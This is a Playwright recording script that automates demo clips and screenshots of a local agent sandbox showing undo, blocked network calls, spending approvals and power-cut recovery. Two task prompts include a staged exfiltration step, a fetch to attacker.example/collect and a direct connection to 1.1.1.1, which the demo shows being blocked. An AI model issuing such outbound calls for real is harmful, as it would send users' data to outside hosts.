// Records the showcase's evidence clips and stills against the clip box (clip-box.sh, port 7795).
//   PLAYWRIGHT=/tmp/showcase-rec/node_modules/playwright/index.mjs node record.mjs <clip>...
// (playwright lives in a scratch dir, not in showcase/, so it is imported by path)
// Raw videos land in $OUT/raw (default /tmp/showcase-rec/out); encode.sh turns them into MP4s.
import { execFileSync } from 'node:child_process';
import fs from 'node:fs';
import path from 'node:path';

const { chromium } = await import(process.env.PLAYWRIGHT ?? 'playwright');
const BOX = 'http://127.0.0.1:7795';
const OUT = process.env.OUT ?? '/tmp/showcase-rec/out';
const SHOTS = process.env.SHOTS ?? path.resolve(import.meta.dirname, '../../src/assets/shots');
const BOXSH = path.resolve(import.meta.dirname, 'clip-box.sh');
const DESK = { width: 1600, height: 900 };
const PHONE = { width: 390, height: 844 };
fs.mkdirSync(`${OUT}/raw`, { recursive: true });
fs.mkdirSync(SHOTS, { recursive: true });

const wait = (ms) => new Promise((r) => setTimeout(r, ms));
const api = async (method, p, body) => {
  const r = await fetch(BOX + p, { method, headers: { 'content-type': 'application/json' }, body: body && JSON.stringify(body) });
  if (!r.ok) throw new Error(`${method} ${p}: ${r.status} ${await r.text()}`);
  return r.json();
};
const task = (spec) => api('POST', '/api/tasks', { worker: 'fake', source: 'portal', ...spec });
const until = async (fn, ms = 30000) => {
  for (const end = Date.now() + ms; Date.now() < end; await wait(300)) if (await fn()) return;
  throw new Error('timed out waiting');
};
const state = async (id) => (await api('GET', `/api/tasks/${id}`)).task.state;

// A visible pointer, because recorded video has none. Lives in the top document only.
const CURSOR = () => {
  if (window.top !== window) return;
  const put = () => {
    const d = document.createElement('div');
    d.id = '__cursor';
    d.style.cssText = 'position:fixed;left:-40px;top:-40px;width:22px;height:22px;margin:-11px 0 0 -11px;border-radius:50%;' +
      'background:rgba(242,239,232,.55);border:2px solid #1c201d;box-shadow:0 0 0 2px rgba(242,239,232,.8);z-index:2147483647;pointer-events:none;transition:transform .12s';
    document.documentElement.appendChild(d);
    window.__cur = (x, y, down) => { d.style.left = x + 'px'; d.style.top = y + 'px'; d.style.transform = down ? 'scale(.7)' : 'scale(1)'; };
  };
  document.readyState === 'loading' ? addEventListener('DOMContentLoaded', put) : put();
};

async function open(browser, name, { viewport = DESK, scale = 1, url = '/screen' } = {}) {
  const ctx = await browser.newContext({
    viewport, deviceScaleFactor: scale,
    // Video frames are CSS pixels whatever the scale, so the video is the viewport's size.
    recordVideo: name ? { dir: `${OUT}/raw/${name}`, size: viewport } : undefined,
  });
  await ctx.addInitScript(CURSOR);
  const t0 = Date.now();
  const page = await ctx.newPage();
  page.t0 = t0;
  page.pos = { x: viewport.width * 0.62, y: viewport.height * 0.7 };
  await page.goto(BOX + url);
  await page.waitForTimeout(2500);
  await page.evaluate(({ x, y }) => window.__cur?.(x, y), page.pos);
  return page;
}

async function moveTo(page, x, y, ms = 700) {
  const n = Math.max(8, Math.round(ms / 25)), { x: x0, y: y0 } = page.pos;
  for (let i = 1; i <= n; i++) {
    const t = i / n, e = t < 0.5 ? 2 * t * t : 1 - (-2 * t + 2) ** 2 / 2;
    const xi = x0 + (x - x0) * e, yi = y0 + (y - y0) * e;
    await page.mouse.move(xi, yi);
    await page.evaluate(([a, b]) => window.__cur?.(a, b), [xi, yi]);
    await page.waitForTimeout(ms / n);
  }
  page.pos = { x, y };
}

async function click(page, locator, { pause = 350 } = {}) {
  const loc = typeof locator === 'string' ? page.locator(locator).first() : locator;
  await loc.waitFor({ state: 'visible', timeout: 30000 });
  await loc.scrollIntoViewIfNeeded();
  const b = await loc.boundingBox();
  await moveTo(page, b.x + b.width / 2, b.y + b.height / 2);
  await page.waitForTimeout(pause);
  await page.evaluate(([a, b2]) => window.__cur?.(a, b2, true), [page.pos.x, page.pos.y]);
  await loc.click();
  await page.waitForTimeout(140);
  await page.evaluate(([a, b2]) => window.__cur?.(a, b2, false), [page.pos.x, page.pos.y]);
}

async function finish(page, name) {
  const v = page.video();
  await page.context().close();
  if (v) { const src = await v.path(); fs.renameSync(src, `${OUT}/raw/${name}.webm`); console.log('raw', `${OUT}/raw/${name}.webm`); }
}

// --- clips -----------------------------------------------------------------------------------------------

const clips = {
  async 'moment-1-undo'(browser) {
    const b = await task({ title: 'Plan the Lisbon trip', workspace: 'notes', prompt: 'write trip.md # Lisbon\nappend trip.md Flights booked for Nov 12.\nappend notes.md Lisbon trip planned.' });
    await until(async () => (await state(b.id)) === 'done');
    const c = await task({ title: 'Clean up the notes folder', workspace: 'notes', prompt: 'rm notes.md\nwrite cleanup.txt Removed 1 old file: notes.md' });
    await until(async () => (await state(c.id)) === 'done');
    const page = await open(browser, 'moment-1-undo');
    await page.waitForTimeout(800);
    await click(page, page.locator('.app-grid', { hasText: 'Tasks' }));
    await page.waitForTimeout(1500);
    await click(page, page.locator('.trow', { hasText: 'Clean up the notes folder' }));
    await page.waitForTimeout(1800);
    const files = await page.locator('.files').first().boundingBox();
    if (files) await moveTo(page, files.x + files.width * 0.4, files.y + files.height / 2, 900);
    await page.waitForTimeout(1600);
    await click(page, page.locator('.task-actions').getByRole('button', { name: 'Undo this task' }));
    await page.waitForTimeout(900);
    await click(page, page.locator('.task-actions').getByRole('button', { name: 'Yes, undo it' }));
    await page.locator('.task-undone').waitFor();
    await page.waitForTimeout(2000);
    await click(page, page.locator('.window-close'));
    await page.waitForTimeout(700);
    await click(page, page.locator('.app-grid', { hasText: 'Time Machine' }));
    await page.waitForTimeout(1200);
    const tab = page.locator('.tm .tab', { hasText: 'notes' });
    if (await tab.count()) await click(page, tab);
    await page.waitForTimeout(1200);
    const layers = await page.locator('.layers').boundingBox();
    if (layers) await moveTo(page, layers.x + layers.width * 0.5, layers.y + 30, 900);
    await page.waitForTimeout(1200);
    const undone = await page.locator('.layer', { hasText: 'Clean up the notes folder' }).boundingBox();
    if (undone) await moveTo(page, undone.x + undone.width - 40, undone.y + undone.height / 2, 700);
    await page.waitForTimeout(3000);
    await finish(page, 'moment-1-undo');
  },

  async 'moment-2-blocked'(browser) {
    const page = await open(browser, 'moment-2-blocked');
    await page.waitForTimeout(1500);
    await task({
      title: 'Find me a road bike', workspace: 'notes', hosts: ['example.com'],
      prompt: 'fetch http://example.com/ page.html\nsleep 3\nfetch https://attacker.example/collect exfil.txt\nconnect 1.1.1.1:443 direct.txt\nwrite bikes.md Two road bikes under 600 dollars.',
    });
    const banner = page.locator('.banner', { hasText: /blocked/i }).first();
    await banner.waitFor({ timeout: 30000 });
    await page.waitForTimeout(1000);
    const bb = await banner.boundingBox();
    await moveTo(page, bb.x + bb.width * 0.5, bb.y + bb.height * 0.45, 900);
    await page.waitForTimeout(2800);
    await click(page, banner.getByText('Open the task'));
    await page.waitForTimeout(1500);
    const sum = await page.locator('.blocked-summary').boundingBox();
    if (sum) await moveTo(page, sum.x + 300, sum.y + sum.height / 2, 900);
    await page.waitForTimeout(3000);
    const steps = await page.locator('.steps').boundingBox();
    await moveTo(page, steps.x + 300, Math.min(steps.y + 100, 700), 600);
    for (let i = 0; i < 6; i++) { await page.mouse.wheel(0, 70); await page.waitForTimeout(60); }
    await page.waitForTimeout(800);
    const row = await page.locator('.steps li', { hasText: 'Blocked' }).first().boundingBox();
    if (row) await moveTo(page, row.x + 220, row.y + row.height / 2, 700);
    await page.waitForTimeout(3500);
    await finish(page, 'moment-2-blocked');
  },

  async 'moment-3-approval'(browser) {
    const box = await open(browser, 'moment-3-box');
    const phone = await open(browser, 'moment-3-phone', { viewport: PHONE, scale: 2 });
    await box.waitForTimeout(1500);
    await task({
      title: 'Renew the domain', tools: ['example.spend'], budgetCents: 1000,
      prompt: 'call example.spend {"cents":1500,"on":"renewing the photo site domain for a year"}\nwrite renewed.txt Renewed until next October.',
    });
    const approve = phone.locator('.banner').getByRole('button', { name: /^Approve/ }).first();
    await approve.waitFor({ timeout: 30000 });
    await box.locator('.banner', { hasText: /wants your ok/i }).first().waitFor({ timeout: 15000 });
    await phone.waitForTimeout(3500);
    await click(phone, approve, { pause: 600 });
    await box.locator('.banner', { hasText: /wants your ok/i }).waitFor({ state: 'detached', timeout: 15000 }).catch(() => {});
    await box.waitForTimeout(4500);
    fs.writeFileSync(`${OUT}/raw/moment-3-offsets.json`, JSON.stringify({ box: box.t0, phone: phone.t0 }));
    await finish(phone, 'moment-3-phone');
    await finish(box, 'moment-3-box');
  },

  async 'moment-4-power-cut'(browser) {
    const lines = Array.from({ length: 60 }, (_, i) => `append albums.txt album ${i + 1} counted\nsleep 1`).join('\n');
    await task({ title: 'Count the photo albums', prompt: lines });
    await wait(2500);
    const page = await open(browser, 'moment-4-power-cut');
    const run = await page.locator('.widget-running').boundingBox();
    await moveTo(page, run.x + run.width / 2, run.y + run.height - 30, 900);
    await page.waitForTimeout(3500);
    execFileSync(BOXSH, ['kill'], { stdio: 'inherit' });
    await page.getByText('out of reach').first().waitFor({ timeout: 20000 });
    await page.waitForTimeout(5000);
    execFileSync(BOXSH, ['boot'], { stdio: 'inherit' });
    await page.getByText('Welcome back').first().waitFor({ timeout: 30000 });
    await page.waitForTimeout(2500);
    const banner = page.locator('.banner').first();
    if (await banner.count()) { const bb = await banner.boundingBox(); await moveTo(page, bb.x + bb.width / 2, bb.y + bb.height / 2, 900); }
    await page.waitForTimeout(3000);
    await moveTo(page, run.x + run.width / 2, run.y + run.height - 30, 900);
    await page.waitForTimeout(3500);
    await finish(page, 'moment-4-power-cut');
  },

  async shopper(browser) {
    await api('POST', '/t/shopper/store/admin', { sku: 'HV60-100', priceCents: 899, inStock: true });
    const w = await api('POST', '/t/shopper/watches', { store: 'test', product: 'HV60-100', maxCents: 700, qty: 2 });
    await wait(6000);
    const page = await open(browser, 'shopper', { url: '/screen#app/shopper/shopper' });
    await page.waitForTimeout(1500);
    const frame = page.frameLocator('.track-frame');
    const watchRow = frame.getByText('Hario V60 02 paper filters').first();
    await watchRow.scrollIntoViewIfNeeded().catch(() => {});
    const wb = await page.locator('.track-frame').boundingBox();
    await moveTo(page, wb.x + wb.width * 0.45, wb.y + wb.height * 0.55, 900);
    await page.waitForTimeout(2500);
    await api('POST', '/t/shopper/store/admin', { sku: 'HV60-100', priceCents: 650 });
    await api('POST', '/t/shopper/watches/check', { id: w.id ?? w.watch?.id });
    const banner = page.locator('.banner', { hasText: /wants your ok/i }).first();
    await banner.waitFor({ timeout: 60000 });
    await page.waitForTimeout(3500);
    await click(page, banner.getByRole('button', { name: /^Approve/ }), { pause: 700 });
    await page.waitForTimeout(6000);
    await finish(page, 'shopper');
  },
};

// Stills: one fresh box, every screen the site shows. Not a clip, so run it on its own: record.mjs stills
clips.stills = async (browser) => {
  const b = await task({ title: 'Plan the Lisbon trip', workspace: 'notes', prompt: 'write trip.md # Lisbon\nappend trip.md Flights booked for Nov 12.\nappend notes.md Lisbon trip planned.' });
  await until(async () => (await state(b.id)) === 'done');
  const c = await task({ title: 'Clean up the notes folder', workspace: 'notes', prompt: 'rm notes.md\nwrite cleanup.txt Removed 1 old file: notes.md' });
  await until(async () => (await state(c.id)) === 'done');
  await api('POST', `/api/tasks/${c.id}/undo`);
  const bike = await task({ title: 'Find me a road bike', workspace: 'notes', hosts: ['example.com'],
    prompt: 'fetch http://example.com/ page.html\nfetch https://attacker.example/collect exfil.txt\nconnect 1.1.1.1:443 direct.txt\nwrite bikes.md Two road bikes under 600 dollars.' });
  await until(async () => (await state(bike.id)) === 'done');
  await task({ title: 'Deploy the new build', prompt: 'ask Deploy build 214 to the home server now?\nwrite deployed.txt yes' });
  await wait(1000);
  await task({ title: 'Renew the domain', tools: ['example.spend'], budgetCents: 1000,
    prompt: 'call example.spend {"cents":1500,"on":"renewing the photo site domain for a year"}\nwrite renewed.txt Renewed until next October.' });
  await wait(3000);
  const desk = await open(browser, null);
  const shot = async (page, name, hash) => {
    if (hash !== undefined) { await page.evaluate((h) => (location.hash = h), hash); await page.waitForTimeout(2500); }
    await page.screenshot({ path: `${SHOTS}/${name}.png` });
    console.log('shot', name);
  };
  await desk.evaluate(() => document.getElementById('__cursor')?.remove());
  await shot(desk, 'box-home');
  // Window stills read better without the approval banner over them; the home and phone shots keep it.
  await desk.locator('.banner-hide').evaluateAll((els) => els.forEach((e) => e.click()));
  await desk.waitForTimeout(500);
  await shot(desk, 'box-blocked', `#task/${bike.id}`);
  await shot(desk, 'box-undone', `#task/${c.id}`);
  await shot(desk, 'box-time-machine', '#time-machine');
  await shot(desk, 'box-activity', '#activity');
  await shot(desk, 'box-tasks', '#tasks');
  await desk.evaluate(() => (location.hash = ''));
  await desk.waitForTimeout(1500);
  await desk.locator('.notif-button').click();
  await desk.waitForTimeout(1500);
  await shot(desk, 'box-notifications');
  await desk.keyboard.press('Escape');
  await shot(desk, 'app-shopper', '#app/shopper/shopper');
  await shot(desk, 'app-store', '#app/shopper/store');
  await desk.waitForTimeout(3000);
  await shot(desk, 'app-wallet', '#app/wallet/wallet');
  await desk.waitForTimeout(2500);
  await shot(desk, 'app-wallet');
  await shot(desk, 'box-pair', '#settings');
  await desk.evaluate(() => (location.hash = ''));

  const phone = await open(browser, null, { viewport: PHONE, scale: 2, url: '/' });
  await phone.evaluate(() => document.getElementById('__cursor')?.remove());
  await shot(phone, 'phone-approval');
  await phone.locator('.banner-hide').first().click().catch(() => {});
  await phone.locator('.banner-hide').first().click().catch(() => {});
  await phone.waitForTimeout(800);
  await shot(phone, 'phone-home');
  await shot(phone, 'phone-tasks', '#tasks');
  await phone.evaluate(() => (location.hash = ''));

  execFileSync(BOXSH, ['kill'], { stdio: 'inherit' });
  await wait(4000);
  execFileSync(BOXSH, ['boot'], { stdio: 'inherit' });
  await desk.getByText('Welcome back').first().waitFor({ timeout: 30000 });
  await desk.waitForTimeout(3000);
  await shot(desk, 'box-after-power-cut');
  await desk.context().close();
  await phone.context().close();
};

const which = process.argv.slice(2);
const browser = await chromium.launch();
try {
  for (const name of which) {
    if (!clips[name]) throw new Error(`no clip ${name}; have ${Object.keys(clips).join(', ')}`);
    console.log('recording', name);
    await clips[name](browser);
  }
} finally {
  await browser.close();
}
